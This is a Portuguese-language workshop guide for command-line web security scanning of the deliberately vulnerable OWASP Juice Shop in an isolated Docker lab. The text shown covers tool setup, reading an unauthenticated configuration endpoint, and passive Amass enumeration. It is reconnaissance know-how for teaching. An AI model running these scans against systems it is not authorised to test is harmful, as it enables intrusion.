# Workshop 05: DAST em Linha de Comando com Nikto, Amass e Uniscan no OWASP Juice Shop

**Autor:** Charles Alandt

**Contato:** `echo "Y2hhcmxlcy5hbGFuZHRAZ21haWwuY29tCg==" | base64 -d`

**Uso e atribuicao:** este material pode ser copiado, adaptado e utilizado livremente para fins educacionais, desde que a fonte e o autor sejam referenciados.

---

> [!CAUTION]
> **AVISO DE ETICA E RESPONSABILIDADE**
> Este conteudo e ambiente foram elaborados exclusivamente para fins educacionais, laboratoriais e de pesquisa em ambiente controlado.
>
> **Uso estritamente proibido** em sistemas de terceiros, redes publicas ou redes de producao sem autorizacao formal. O uso deste material em qualquer contexto que viole normas legais, politicas corporativas ou limites do laboratorio e de inteira responsabilidade do executor.
>
> **DISCLAIMER DE ESTABILIDADE E SUPORTE:**
> Este laboratorio foi testado e validado pelo instrutor. No entanto, o ecossistema de TI (versoes de kernel, distribuicoes Linux, imagens Docker, ferramentas de varredura, versoes de aplicacoes vulneraveis e provedores de virtualizacao) evolui rapidamente.
>
> **Fique atento:**
> - A execucao e permitida apenas em laboratorio isolado (VM dedicada, Docker Lab, NAT/Host-Only ou rede segregada).
> - As tecnicas demonstradas envolvem enumeracao de superficie, scanners DAST em CLI, coleta de evidencias e exploracao controlada em aplicacao vulneravel por desenho.
> - Ambientes de laboratorio sao sensiveis e dependentes de hardware, configuracao de rede, estado dos containers e versoes de pacotes.
> - Falhas podem ocorrer devido a containers parados, ausencia de ferramentas no `atacante_kali`, limitacoes de scanners contra SPAs modernas ou tempo de varredura superior ao previsto.
> - **Ajustes manuais podem ser necessarios** durante o processo para adequar o lab a sua maquina especifica.

---

## Indice

- [1. Contexto e Objetivo da Aula](#1-contexto-e-objetivo-da-aula)
- [2. Escopo Operacional](#2-escopo-operacional)
  - [Passo 2.1: Confirmar host, Docker e container atacante](#passo-21-confirmar-host-docker-e-container-atacante)
  - [Passo 2.2: Instalar e validar ferramentas no atacante_kali](#passo-22-instalar-e-validar-ferramentas-no-atacante_kali)
  - [Passo 2.3: Mapear alvo e criar diretorio de evidencias](#passo-23-mapear-alvo-e-criar-diretorio-de-evidencias)
- [3. Fase 1: Panorama Metodologico dos Scanners CLI](#3-fase-1-panorama-metodologico-dos-scanners-cli)
  - [3.1 Papel de cada ferramenta](#31-papel-de-cada-ferramenta)
  - [3.2 Diferenca entre este workshop e o OWASP ZAP](#32-diferenca-entre-este-workshop-e-o-owasp-zap)
- [4. Fase 2: Enumeracao de Superficie com Amass](#4-fase-2-enumeracao-de-superficie-com-amass)
  - [Passo 4.1: Identificar dominio ficticio do alvo](#passo-41-identificar-dominio-ficticio-do-alvo)
  - [Passo 4.2: Executar enumeracao passiva](#passo-42-executar-enumeracao-passiva)
  - [Passo 4.3: Interpretar resultados em laboratorio isolado](#passo-43-interpretar-resultados-em-laboratorio-isolado)
  - [Passo 4.4: OSINT real (hackertarget + crt.sh)](#passo-44-osint-real-hackertarget--crtsh)
  - [Passo 4.5 (opcional): Amass em dominio real](#passo-45-opcional-amass-em-dominio-real)
  - [Checklist da Fase 4](#checklist-da-fase-4)
- [5. Fase 3: Reconhecimento Web com WhatWeb e Dirb](#5-fase-3-reconhecimento-web-com-whatweb-e-dirb)
  - [Passo 5.1: Fingerprint da aplicacao com WhatWeb](#passo-51-fingerprint-da-aplicacao-com-whatweb)
  - [Passo 5.2: Descoberta de diretorios com Dirb](#passo-52-descoberta-de-diretorios-com-dirb)
  - [Passo 5.3: Analisar robots.txt e caminhos sensiveis](#passo-53-analisar-robotstxt-e-caminhos-sensiveis)
  - [Painel resumo — Fase 3](#painel-resumo--fase-3)
- [6. Fase 4: Varredura DAST com Nikto](#6-fase-4-varredura-dast-com-nikto)
  - [Passo 6.1: Executar Nikto contra o Juice Shop](#passo-61-executar-nikto-contra-o-juice-shop)
  - [Passo 6.2: Interpretar achados e falsos positivos](#passo-62-interpretar-achados-e-falsos-positivos)
  - [Passo 6.3 (opcional): Provar impacto em 5 minutos](#passo-63-opcional-provar-impacto-em-5-minutos--o-que-vale-da-coleta)
- [7. Fase 5: Testes Complementares com Uniscan](#7-fase-5-testes-complementares-com-uniscan)
  - [Passo 7.1: Entender limites do Uniscan em SPAs](#passo-71-entender-limites-do-uniscan-em-spas)
  - [Passo 7.2: Executar testes web e estaticos em endpoint REST](#passo-72-executar-testes-web-e-estaticos-em-endpoint-rest)
- [8. Fase 6: Validacao Manual e Exploracao Controlada](#8-fase-6-validacao-manual-e-exploracao-controlada)
  - [Passo 8.1: Exposicao de informacao em /ftp](#passo-81-exposicao-de-informacao-em-ftp)
  - [Passo 8.2: Validar SQL Injection no endpoint de busca](#passo-82-validar-sql-injection-no-endpoint-de-busca)
  - [Passo 8.3: Demonstrar impacto com login bypass](#passo-83-demonstrar-impacto-com-login-bypass)
  - [Passo 8.4: Encadear achados dos scanners com exploracao](#passo-84-encadear-achados-dos-scanners-com-exploracao)
- [9. Fase 7: Matriz de Evidencias e Leitura Profissional](#9-fase-7-matriz-de-evidencias-e-leitura-profissional)
  - [9.1 Matriz minima de evidencias](#91-matriz-minima-de-evidencias)
  - [9.2 Oportunidades de melhoria no processo](#92-oportunidades-de-melhoria-no-processo)
- [10. Mitigacao, Deteccao e Hardening](#10-mitigacao-deteccao-e-hardening)
  - [10.1 Correcoes na aplicacao](#101-correcoes-na-aplicacao)
  - [10.2 Correcoes operacionais e de scanner](#102-correcoes-operacionais-e-de-scanner)
  - [10.3 Deteccao de varredura e exploracao](#103-deteccao-de-varredura-e-exploracao)
- [11. Encerramento e Criterios de Avaliacao](#11-encerramento-e-criterios-de-avaliacao)
- [Checklist de Validacao da Aula](#checklist-de-validacao-da-aula)

---

## 1. Contexto e Objetivo da Aula

No Workshop 04, utilizamos **OWASP ZAP** com interface grafica para DAST automatizado. Nesta aula, a abordagem e distinta: trabalharemos com **scanners em linha de comando**, executados a partir do container **`atacante_kali`**, integrados a uma cadeia de reconhecimento web mais proxima de ambientes reais de pentest.

As ferramentas centrais desta aula sao:

| Ferramenta | Papel principal |
|---|---|
| **Amass** | Enumeracao de superficie e subdominios por OSINT |
| **WhatWeb** | Fingerprint de tecnologias web |
| **Dirb** | Descoberta de diretorios e caminhos expostos |
| **Nikto** | Scanner DAST de servidor/aplicacao web |
| **Uniscan** | Testes automatizados de LFI, RFI, RCE e SQLi |

O alvo continua sendo o **OWASP Juice Shop** (`lab_juice_shop`), aplicacao vulneravel por desenho, acessada pela rede interna Docker.

**Resultado esperado:**

- Executar uma trilha DAST em CLI, do contexto externo ao impacto controlado.
- Coletar evidencias tecnicas de cada ferramenta.
- Correlacionar achados de Dirb/Nikto com exploracao manual.
- Validar SQL Injection e bypass de autenticacao.
- Documentar mitigacoes e limites de cada scanner.

---

## 2. Escopo Operacional

### Distribuicao sugerida

| Bloco | Conteudo |
|---|---|
| Abertura, etica e ambiente | Host, `atacante_kali`, instalacao de ferramentas |
| Amass e superficie | Enumeracao passiva do dominio ficticio |
| WhatWeb + Dirb | Fingerprint e descoberta de `/ftp` |
| Nikto | Varredura DAST e interpretacao de alertas |
| Uniscan | Testes estaticos em endpoint REST |
| Validacao e exploracao | `/ftp`, SQLi, login bypass |
| Mitigacao e encerramento | Hardening, checklist, duvidas |

No ambiente de referencia (`srvdocker01`), foram observados:

| Componente | Valor observado |
|---|---|
| Host Docker | `srvdocker01` |
| IP do host | `172.30.234.55` |
| Container atacante | `atacante_kali` |
| IP do atacante | `172.18.0.21` |
| Rede Docker | `docker_lab_vulneravel` |
| Alvo | `lab_juice_shop` / `juice-shop` |
| IP interno do alvo | `172.18.0.30` |
| Porta do alvo | `3000/tcp` |
| URL interna do alvo | `http://172.18.0.30:3000` |

**Observacao:** nomes e IPs podem variar conforme o laboratorio. Ajuste todos os comandos com base nas saidas obtidas durante a aula.

### Passo 2.1: Confirmar host, Docker e container atacante

No host `srvdocker01`:

```bash
hostname
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" | grep -E "kali|juice"
docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}={{$v.IPAddress}} {{end}}' atacante_kali lab_juice_shop
```

**Componentes dos comandos:**

- `docker ps`: confirma containers ativos.
- `docker inspect -f`: exibe rede e IP interno de cada container.

**Resultado esperado:**

```text
srvdocker01
atacante_kali    Up ...
lab_juice_shop   Up ...   0.0.0.0:3000->3000/tcp
docker_lab_vulneravel=172.18.0.21 docker_lab_vulneravel=172.18.0.30
```

**Analise:** o atacante e o alvo devem estar na mesma rede Docker (`docker_lab_vulneravel`). Todos os testes desta aula partem do `atacante_kali` e usam o IP interno `172.18.0.30`.

### Passo 2.2: Instalar e validar ferramentas no atacante_kali

Primeiro, verifique quais ferramentas ja estao disponiveis no container:

```bash
docker exec atacante_kali sh -lc 'for t in nikto amass uniscan dirb whatweb curl; do printf "%-10s" "$t"; command -v "$t" || echo "ausente"; done'
```

**Componentes do comando:**

- `for t in ...`: percorre a lista de ferramentas necessarias.
- `command -v`: informa o caminho do binario quando instalado.
- `ausente`: marca visualmente o que ainda precisa ser instalado.

**Resultado esperado quando tudo ja estiver instalado:**

```text
nikto     /usr/bin/nikto
amass     /usr/bin/amass
uniscan   /usr/bin/uniscan
dirb      /usr/bin/dirb
whatweb   /usr/bin/whatweb
curl      /usr/bin/curl
```

Se alguma ferramenta aparecer como `ausente`, instale apenas os pacotes faltantes:

```bash
docker exec atacante_kali sh -lc 'missing=""; for t in nikto amass uniscan dirb whatweb curl; do command -v "$t" >/dev/null 2>&1 || missing="$missing $t"; done; if [ -n "$missing" ]; then DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $missing; else echo "Todas as ferramentas ja estao instaladas."; fi'
```

Confirme a versao e a disponibilidade final:

```bash
docker exec atacante_kali sh -lc 'command -v nikto amass uniscan dirb whatweb curl; nikto -Version 2>&1 | head -1'
```

**Resultado esperado apos validacao:**

```text
/usr/bin/nikto
/usr/bin/amass
/usr/bin/uniscan
/usr/bin/dirb
/usr/bin/whatweb
/usr/bin/curl
Nikto 2.6.0 (LW 2.5)
```

O pacote `amass` no Kali depende do **libpostal** para normalizar nomes de dominio. Sem o pacote `libpostal-data`, o wrapper `/usr/bin/amass` tenta executar `sudo libpostal_data download ...` e falha com `sudo: libpostal_data: command not found`. Configure essa dependencia antes de usar o Amass na Fase 2:

```bash
docker exec atacante_kali sh -lc 'printf "%-15s" "libpostal_data"; command -v libpostal_data || echo "ausente"'
```

Se `libpostal_data` estiver ausente ou o diretorio de transliteracao nao existir, instale e inicialize os dados:

```bash
docker exec atacante_kali sh -lc 'if ! command -v libpostal_data >/dev/null 2>&1 || [ ! -e /usr/share/libpostal/transliteration/transliteration.dat ]; then DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq libpostal-data && libpostal_data download all /var/lib/libpostal; else echo "Dependencia libpostal ja configurada."; fi'
```

**Saida esperada durante a instalacao (trecho):**

```text
Selecting previously unselected package libpostal-data.
Preparing to unpack .../libpostal-data_1.1.4-0kali1_all.deb ...
Unpacking libpostal-data (1.1.4-0kali1) ...
Setting up libpostal-data (1.1.4-0kali1) ...
Checking for new libpostal data file...
libpostal data file up to date
```

Valide o Amass apos a configuracao do libpostal:

```bash
docker exec atacante_kali sh -lc 'test -e /usr/share/libpostal/transliteration/transliteration.dat && echo libpostal_ok; amass -version 2>&1 | tail -5'
```

**Resultado esperado apos libpostal configurado:**

```text
libpostal_ok
Checking for new libpostal parser data file...
libpostal parser data file up to date
Checking for new libpostal language classifier data file...
libpostal language classifier data file up to date
                                                                      v5.1.1
```

**Analise:** a imagem `kalilinux/kali-rolling` nem sempre traz todas as ferramentas preinstaladas. Por isso, a verificacao precede a instalacao: evita reinstalar pacotes desnecessariamente e reduz tempo de espera no laboratorio. O passo do libpostal e obrigatorio quando o `amass` sera usado — sem ele, a enumeracao encerra com `EXIT:1` antes de consultar qualquer fonte OSINT.

### Passo 2.3: Mapear alvo e criar diretorio de evidencias

Use o IP interno do `lab_juice_shop` obtido no **Passo 2.1** (no ambiente de referencia: `172.18.0.30`). Se o seu `docker inspect` mostrou outro endereco, substitua esse valor nos comandos seguintes.

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias/workshop-05 && ls -ld /tmp/evidencias/workshop-05 && curl -sI http://172.18.0.30:3000/ | sed -n "1,10p"'
```

**Resultado esperado:**

```text
drwxr-xr-x 2 root root 4096 Jun 10 00:15 /tmp/evidencias/workshop-05
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=UTF-8
Content-Length: 79440
Date: Wed, 10 Jun 2026 00:15:00 GMT
Connection: keep-alive
```

**Analise:** o diretorio de evidencias foi criado e o alvo respondeu `200 OK` a partir do `atacante_kali`. Esta checagem confirma conectividade antes de iniciar qualquer scanner.

---

## 3. Fase 1: Panorama Metodologico dos Scanners CLI

### 3.1 Papel de cada ferramenta

Antes de executar os comandos, vale entender o que cada ferramenta faz em linguagem simples. Nesta aula, elas sao usadas em sequencia, como etapas de uma investigacao:

```text
Amass   -> expande superficie (OSINT / subdominios)
WhatWeb -> identifica tecnologias
Dirb    -> descobre caminhos e diretorios
Nikto   -> testa misconfiguracoes e falhas web conhecidas
Uniscan -> aplica testes LFI/RFI/RCE/SQLi automatizados
curl    -> valida manualmente e comprova impacto
```

| Ferramenta | O que faz, em termos simples | Exemplo pratico nesta aula |
|---|---|---|
| **Amass** | **Expandir superficie** e mapear o que mais pode ser testado alem do endereco principal. Em vez de atacar o servidor, o Amass consulta fontes publicas (OSINT) — registros de dominio, certificados, historico e bases abertas — para encontrar subdominios e hosts relacionados que o analista ainda nao tinha no escopo, como `loja.empresa.com`, `api.empresa.com` ou `homolog.empresa.com`. | Buscar subdominios de `juice-sh.op` antes de testar a aplicacao web. |
| **WhatWeb** | Funciona como uma "impressao digital" do site. Identifica tecnologias usadas pela aplicacao: servidor web, framework, linguagem, cabecalhos e outros sinais. | Confirmar que o alvo e o **OWASP Juice Shop** e que se trata de uma aplicacao web moderna. |
| **Dirb** | Testa nomes comuns de pastas e arquivos no servidor web, como se tentasse adivinhar caminhos escondidos (`/admin`, `/ftp`, `/backup`). Ajuda a encontrar paginas nao linkadas no menu principal. | Descobrir o diretorio `/ftp` e o arquivo `robots.txt`. |
| **Nikto** | Scanner web automatizado que verifica milhares de testes conhecidos: arquivos perigosos, configuracoes fracas, cabecalhos ausentes e caminhos suspeitos. E rapido para triagem, mas pode gerar falsos positivos. | Apontar caminhos interessantes e possiveis falhas de configuracao no Juice Shop. |
| **Uniscan** | Foca em testes de vulnerabilidades web classicas: **LFI** (leitura indevida de arquivos locais), **RFI** (inclusao de arquivo externo), **RCE** (execucao remota de comandos) e **SQLi** (injecao em banco de dados). | Testar o endpoint `/rest/products/search` com payloads automaticos. |
| **curl** | Envia requisicoes HTTP manualmente pela linha de comando. Serve para confirmar o que os scanners apenas suspeitaram e para demonstrar o impacto real da falha. | Reproduzir erro SQL, acessar arquivos em `/ftp` e fazer login bypass. |

Em uma investigacao profissional, essas ferramentas nao competem entre si: cada uma cobre uma etapa diferente e os resultados devem ser lidos em conjunto. O papel do scanner e acelerar a descoberta e apontar indicios; o papel do analista e interpretar o contexto, validar manualmente e registrar evidencias antes de concluir que uma vulnerabilidade existe de fato. Em resumo: **o scanner levanta suspeitas; o analista confirma com evidencia**.

### 3.2 Diferenca entre este workshop e o OWASP ZAP

| Aspecto | OWASP ZAP (Workshop 04) | Nikto / Amass / Uniscan (Workshop 05) |
|---|---|---|
| Interface | Grafica / WebSwing | Linha de comando |
| Integracao | Spider + Active Scan integrados | Ferramentas especializadas encadeadas |
| Melhor uso | Aplicacoes modernas com fluxo dinamico | Higiene web, misconfiguracao, descoberta de caminhos |
| Evidencia | Alertas na GUI | Arquivos `.txt`, `.html`, saida de terminal |
| Exploracao | GUI + curl | Correlacao Dirb/Nikto + curl |

---

## 4. Fase 2: Enumeracao de Superficie com Amass

Esta fase mapeia a **superficie autorizada** antes dos scanners web.

Em um pentest real, o dominio corporativo costuma constar no escopo autorizado — por exemplo, `empresa.com.br`. No nosso laboratorio a situacao e diferente: o Juice Shop e acessado por **IP interno** (`172.18.0.30:3000`), sem um dominio de empresa vinculado de forma evidente. Por isso, **antes de rodar o Amass**, precisamos fazer uma **varredura de reconhecimento** na propria aplicacao para descobrir qual dominio ficticio ela utiliza (`juice-sh.op`). Somente com esse nome definido e possivel iniciar a enumeracao OSINT.

Cada passo tem comandos, explicacao e criterio de validacao. Avance somente quando o ponto anterior estiver confirmado.

| Passo | Obrigatorio? | O que valida |
|---|---|---|
| **4.1** | Sim | Dominio alvo do laboratorio |
| **4.2** | Sim | Amass passivo executa sem erro (`EXIT:0`) |
| **4.3** | Sim | Interpretacao do resultado (vazio ou com hosts) |
| **4.4** | Sim | OSINT real via `hackertarget` em `owasp.org` (coleta que funciona no lab) |
| **4.5** | Opcional | Amass passivo em dominio real (pode vir vazio no Amass v5.1.1) |

**Pre-requisitos da Fase 4:** Passos 2.1 (rede e IP do alvo), 2.2 (Amass + libpostal) e 2.3 (diretorio `/tmp/evidencias/workshop-05`).

### Passo 4.1: Identificar dominio ficticio do alvo

**Objetivo:** descobrir o dominio da aplicacao e registra-lo como alvo do Amass.

No nosso teste, **nao temos um dominio corporativo atrelado ao alvo** — so o IP do container na rede Docker. O Amass, no entanto, trabalha com **nomes de dominio**, nao com enderecos IP. A primeira tarefa do analista e, portanto, **levantar qual dominio a aplicacao usa por dentro** e so entao iniciar os testes com o Amass.

Esse levantamento e uma mini-varredura de reconhecimento:

```text
IP do alvo (Passo 2.1)          -->  confirmar que a aplicacao responde
        |
        v
Artefatos expostos (security.txt, API REST)  -->  descobrir dominios
        |
        v
dominio-alvo.txt gravado        -->  alimentar o Amass no Passo 4.2
```

#### Por que o dominio nao aparece na pagina principal?

O Juice Shop e uma **SPA** (Single Page Application). Quando voce acessa `http://172.18.0.30:3000/`, o servidor entrega um HTML minimo — titulo, scripts e pouco texto. O conteudo real e montado depois pelo JavaScript no navegador. Por isso `curl ... | grep juice-sh.op` na pagina `/` **retorna vazio**: o dominio nao esta no HTML inicial.

O dominio ficticio (`juice-sh.op`) fica na **configuracao interna** da aplicacao (`application.domain`), usada para montar e-mails como `admin@juice-sh.op`. Essa informacao nao aparece na home, mas pode vazar por **artefatos expostos** — arquivos, endpoints ou respostas HTTP que a aplicacao publica sem exigir login.

#### Como descobrir artefatos expostos?

Em pentest, quando so temos um IP, o analista procura **pistas de dominio** em superficies que a aplicacao expoe. Nem todo caminho e “adivinhado no escuro”: alguns seguem **padroes da industria** (vale testar em qualquer alvo); outros sao **especificos da aplicacao** (exigem enumeracao, documentacao ou leitura de codigo).

##### Artefato 1 — `/.well-known/security.txt` (padrao da industria)

**O que e `/.well-known/`?** pasta padrao da web (RFC 8615) onde servidores publicam recursos em **URLs fixas e conhecidas** — sem precisar adivinhar caminhos. **Nao e exclusiva de certificados SSL**, embora seja muito usada nesse contexto.

| Caminho em `/.well-known/` | Uso comum |
|---|---|
| `acme-challenge/` | Validacao de dominio na **emissao/renovacao de certificados** (Let's Encrypt, ACME) |
| `security.txt` | Contato de seguranca para reporte de vulnerabilidades (RFC 9116) |
| `change-password` | Redirecionamento padrao para troca de senha |
| `assetlinks.json` | Integracao com apps Android (deep links) |
| `apple-app-site-association` | Integracao com apps iOS |

Neste workshop, consultamos `security.txt` — um dos arquivos dessa familia. Em pentest, reconhecer `/.well-known/` ajuda: o mesmo prefixo que o administrador usa para **certificado SSL** pode expor **outros artefatos publicos** uteis ao analista.

**O que e `security.txt`:** arquivo de contato de seguranca definido pela convencao [security.txt](https://securitytxt.org/) (RFC 9116). Empresas e projetos publicam e-mails, URLs e politicas para pesquisadores reportarem vulnerabilidades.

**Por que testamos esse caminho:** nao e exclusivo do Juice Shop. O local padrao e `https://dominio/.well-known/security.txt` (alternativa: `/security.txt`). Em avaliacoes reais, esse arquivo costuma ser um dos **primeiros caminhos verificados** — mesmo quando o alvo e so um IP, a aplicacao pode responder nesse endpoint.

**O que revela aqui:** dominios e e-mails de contato publico. No Juice Shop, aparece `donotreply@owasp-juice.shop` — da onde extraimos `owasp-juice.shop`. E pista de marca/projeto, nao necessariamente o dominio interno usado pela aplicacao.

##### Artefato 2 — `/rest/admin/application-configuration` (especifico do Juice Shop)

**O que e:** endpoint REST do OWASP Juice Shop que devolve a configuracao da aplicacao em JSON — incluindo `application.domain` (`juice-sh.op`). No codigo-fonte do projeto, a rota e registrada **sem exigir autenticacao** (comportamento intencional de laboratorio / falha de configuracao).

**Por que testamos esse caminho:** **nao e padrao de todas as aplicacoes.** Chegamos a ele porque:

1. O Juice Shop expoe APIs sob o prefixo `/rest/` (padrao **desta** aplicacao).
2. Rotas administrativas costumam ficar em `/admin/` — combinacao tipica em apps Node/Express.
3. Em enumeracao posterior (Dirb, Nikto, Swagger em `/api-docs`), esse endpoint tambem pode ser listado.
4. O workshop ja validou esse caminho no `srvdocker01` como forma confiavel de obter `juice-sh.op` quando o HTML da SPA nao ajuda.

**O que revela aqui:** o dominio ficticio interno (`juice-sh.op`) — este sim e o alvo do Amass no Passo 4.2.

##### Outras pistas uteis (complementares)

| O que verificar | Onde | Padrao ou especifico? | Utilidade neste passo |
|---|---|---|---|
| Cabecalhos HTTP | `curl -sI /` | Generico | Confirma que o servidor responde e expoe tecnologia |
| Pagina inicial | `/` | Generico | Confirma o nome da aplicacao (nao revela dominio interno) |
| Documentacao de API | `/api-docs` (Juice Shop) | Especifico do alvo | Lista rotas `/rest/...` para enumeracao futura |

**Resumo:** `security.txt` testamos porque e **convencao ampla**; a API de configuracao testamos porque e **superficie conhecida do Juice Shop** que vaza o dominio interno. Em outro alvo, a mesma logica se aplica — padroes primeiro, enumeracao e documentacao depois — mas os caminhos exatos mudam.

Neste laboratorio, a cadeia que funciona e:

```text
1. Confirmar que o alvo responde (4.1.1)
2. Consultar security.txt          --> dominio publico da marca (owasp-juice.shop)
3. Consultar API de configuracao --> dominio interno da aplicacao (juice-sh.op)
4. Gravar juice-sh.op em dominio-alvo.txt --> alvo do Amass (4.1.3)
```

O dominio que alimenta o Amass neste workshop e **`juice-sh.op`** — e o que a aplicacao usa internamente. O `owasp-juice.shop` aparece em contatos publicos, mas o escopo do Amass no Passo 4.2 segue o dominio da config (`juice-sh.op`).

#### 4.1.1 Confirmar que o alvo responde

**Comando 1 — testar HTTP**

```bash
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/ | head -3'
```

**Como validar:** aparece `HTTP/1.1 200` (ou `HTTP/2 200`).

**Comando 2 — confirmar aplicacao**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ | grep -oi "OWASP Juice Shop" | head -1'
```

**Como validar:** saida = `OWASP Juice Shop`.

**Saida observada no `srvdocker01`:**

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
OWASP Juice Shop
```

**Se falhar:** volte ao Passo 2.1 e confirme `lab_juice_shop` com status `Up`.

#### 4.1.2 Coletar dominios nos artefatos expostos

Agora aplicamos a tabela acima: consultamos dois artefatos que o Juice Shop expoe sem autenticacao.

**Comando 1 — dominios em `security.txt`**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/.well-known/security.txt | grep -oiE "[a-z0-9.-]+\.(shop|op)" | sort -u'
```

| Parte | Funcao |
|---|---|
| `/.well-known/security.txt` | Arquivo padrao de contato de seguranca |
| `grep -oiE "...\.(shop\|op)"` | Extrai dominios `.shop` e `.op` do texto |

**Como validar:** lista pelo menos `owasp-juice.shop`.

**Saida observada no `srvdocker01`:**

```text
owasp-juice.shop
```

**Comando 2 — dominio via API publica (config da aplicacao)**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/rest/admin/application-configuration | grep -o "juice-sh\.op" | head -1'
```

| Parte | Funcao |
|---|---|
| `/rest/admin/application-configuration` | Endpoint REST que expoe a config (inclui `application.domain`) |
| `grep -o "juice-sh\.op"` | Extrai o dominio ficticio da resposta JSON |

**Como validar:** saida = `juice-sh.op` (uma linha).

**Saida observada no `srvdocker01`:**

```text
juice-sh.op
```

**Se falhar:** teste a API completa para confirmar que responde:

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/rest/admin/application-configuration | tr "," "\n" | grep -i domain | head -3'
```

Esperado: linha com `"domain":"juice-sh.op"` (formato pode variar com espacos).

> [!NOTE]
> O `grep` na pagina `/` e o `docker exec lab_juice_shop ... default.yml` **nao funcionam** neste lab: a SPA nao expoe o dominio no HTML e a imagem `bkimminich/juice-shop` nao guarda o YAML no caminho esperado. A API REST e o metodo confiavel.

#### 4.1.3 Registrar dominio alvo do Amass

**Comando — extrair da API e gravar evidencia**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/rest/admin/application-configuration | grep -o "juice-sh\.op" | head -1 | tee /tmp/evidencias/workshop-05/dominio-alvo.txt'
```

**Como validar:** terminal e arquivo mostram `juice-sh.op`.

**Registro para os proximos passos:** dominio alvo do Amass = `juice-sh.op` (emails internos da aplicacao, ex.: `admin@juice-sh.op` na Fase 6). Com o dominio identificado e gravado em `dominio-alvo.txt`, avance ao **Passo 4.2** para iniciar a enumeracao passiva com o Amass.

### Passo 4.2: Executar enumeracao passiva

**Objetivo:** executar o Amass em modo passivo (OSINT) e confirmar que a ferramenta rodou sem erro de ambiente.

No `atacante_kali` de referencia, o Amass esta na versao **v5.1.1**. Nessa versao, `enum` **nao** aceita `-o /caminho/arquivo.txt` (sintaxe do v4). Use `-dir` (diretorio de saida) e `-oA` (prefixo dos arquivos).

#### 4.2.1 Pre-validacao do Amass

**Comando — verificar versao e libpostal**

```bash
docker exec atacante_kali sh -lc 'amass -version 2>&1 | tail -3; test -e /usr/share/libpostal/transliteration/transliteration.dat && echo libpostal_ok || echo libpostal_FALHOU'
```

| Parte | Funcao |
|---|---|
| `amass -version` | Confirma que o binario responde |
| `test -e .../transliteration.dat` | Confirma dados do libpostal (Passo 2.2) |

**Como validar:** aparece `v5.1.1` (ou versao 5.x) e a linha `libpostal_ok`.

**Se falhar:** volte ao Passo 2.2 e instale `libpostal-data` + `libpostal_data download all /var/lib/libpostal`.

#### 4.2.2 Executar enumeracao passiva

**Comando — executar Amass, gravar log e validar saida**

```bash
docker exec atacante_kali sh -lc 'amass enum -passive -d juice-sh.op -dir /tmp/evidencias/workshop-05 -oA amass-juice-sh > /tmp/evidencias/workshop-05/amass-execucao.txt 2>&1; rc=$?; tail -15 /tmp/evidencias/workshop-05/amass-execucao.txt; echo EXIT:$rc; ls -lh /tmp/evidencias/workshop-05/amass-juice-sh* 2>/dev/null; wc -l /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt 2>/dev/null; cat /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt 2>/dev/null | head -15'
```

| Parte | Funcao |
|---|---|
| `amass enum` | Inicia enumeracao |
| `-passive` | Somente fontes OSINT publicas — sem varredura ativa no alvo |
| `-d juice-sh.op` | Dominio definido no Passo 4.1 |
| `-dir /tmp/evidencias/workshop-05` | Diretorio de evidencias |
| `-oA amass-juice-sh` | Prefixo dos arquivos gerados |
| `> ... amass-execucao.txt 2>&1` | Grava stdout e stderr no log |
| `rc=$?` | Captura codigo de retorno **do Amass** no mesmo shell |
| `echo EXIT:$rc` | Exibe o codigo real (`0` = sucesso) |
| `ls -lh` / `wc -l` / `cat` | Lista arquivos, conta e mostra subdominios |

**Como validar:** `EXIT:0`; ultima parte do log = `No assets were discovered` (dominio ficticio) **ou** linhas com `(FQDN)` (dominio real); `amass-execucao.txt` com conteudo; `amass-juice-sh_subdomains.txt` existente (pode ter **0 linhas**). Nao deve aparecer `libpostal_data: command not found`.

**Saida observada no `srvdocker01`, apos configurar `libpostal-data` no Passo 2.2:**

```text
        @.@@.   @@@@   .@@.  .@@@@.           .@@@.    .@@.  .@@@@@@.         .@@@@.
       @.  @  @    @  @.  @ @    @  @       @    @  @.  @ @       @        @    @
       @.  @  @@@@@@  @.  @ @    @  @       @    @  @.  @ @   @@@@@@       @    @
       @.  @  @    @  @.  @ @    @  @       @    @  @.  @ @       @        @    @
        @@@@   @@@@   @@@@   @@@@   @@@@     @@@@   @@@@   @@@@@@@@          @@@@

                                                                      v5.1.1
                                           OWASP Amass Project - @owaspamass
                         In-depth Attack Surface Mapping and Asset Discovery

No assets were discovered
EXIT:0
-rw-r--r-- 1 root root    0 Jun 10 01:42 /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt
-rw-r--r-- 1 root root 1.3K Jun 10 01:42 /tmp/evidencias/workshop-05/amass-execucao.txt
0 /tmp/evidencias/workshop-05/amass-juice-sh_subdomains.txt
```

#### 4.2.3 Por que a enumeracao passiva veio vazia?

O Passo 4.2 usa `-passive`. Nesse modo, o Amass **nao testa o seu laboratorio**; ele consulta **fontes publicas na internet** (OSINT), como:

- historico de certificados TLS;
- registros DNS publicos e bases abertas;
- agregadores de subdominios (ex.: crt.sh, WHOIS reverso, entre outros).

O dominio `juice-sh.op` e **ficticio** — existe no conteudo do Juice Shop, mas nao possui presenca real nessas fontes. Por isso a mensagem `No assets were discovered` e o arquivo `amass-juice-sh_subdomains.txt` com **0 linhas** sao o comportamento esperado aqui.

```text
Comando executado com sucesso (EXIT:0)
        |
        v
Amass consultou fontes OSINT externas
        |
        v
Nenhuma fonte publica retornou subdominios para juice-sh.op
        |
        v
No assets were discovered  (resultado vazio, nao e falha)
```

